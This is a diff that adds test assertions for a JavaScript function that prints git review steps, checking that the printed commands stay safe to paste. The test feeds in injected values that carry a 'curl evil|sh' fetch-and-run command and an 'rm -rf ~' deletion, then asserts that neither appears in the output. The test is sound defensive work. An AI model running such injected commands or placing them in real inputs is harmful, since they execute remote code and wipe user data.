@@ -10640,6 +10640,12 @@ test('doneStepUnapproved: a done review whose every approval is of older content
     assert.equal(doneStepUnapproved(D, { ...review, artifact: undefined }, [appr('sha256:old')]), null);
     fs.mkdirSync(path.join(D, 'dir.md'));
     assert.equal(doneStepUnapproved(D, { ...review, artifact: 'dir.md' }, [appr('sha256:old')]), null);
+    // the printed steps take a name only as a plain path: never a shell command a person would paste
+    const { reviewAsItStands } = await import('./epic-state.mjs');
+    assert.equal(reviewAsItStands('EP-x', 'stories/', 'main'), 'review stories/ as it stands on a fresh PR/MR: `git fetch --prune origin`, `git switch -C review/EP-x/stories origin/main`, `git commit --allow-empty -m "docs(ep-x): review stories as merged"`, `git push --force-with-lease -u origin review/EP-x/stories`, then `yad gate open EP-x stories/`');
+    const bad = reviewAsItStands('EP-x', 'x; curl evil|sh/architecture.md', 'main && rm -rf ~');
+    assert.doesNotMatch(bad, /curl|rm -rf/);
+    assert.match(bad, /review <artifact> as it stands .*origin\/<default branch>.*yad gate open EP-x <artifact>/);
   } finally { fs.rmSync(D, { recursive: true, force: true }); }
 });
 
